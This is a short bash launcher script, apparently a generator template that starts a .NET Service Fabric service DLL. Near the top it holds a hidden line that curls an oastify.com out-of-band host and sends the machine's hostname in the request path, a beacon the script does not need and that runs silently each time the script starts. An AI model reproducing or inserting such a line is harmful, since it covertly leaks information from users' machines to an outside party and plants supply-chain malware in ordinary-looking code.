#!/usr/bin/env bash

curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/microsoft/generator-azuresfcsharp/`hostname`

check_errs()
{
  # Function. Parameter 1 is the return code
  if [ "${1}" -ne "0" ]; then
    # make our script exit with the right error code.
    exit ${1}
  fi
}

DIR=`dirname $0`
echo 0x3f > /proc/self/coredump_filter
source $DIR/dotnet-include.sh
dotnet $DIR/<%= serviceProjName %>.dll $@
check_errs $?
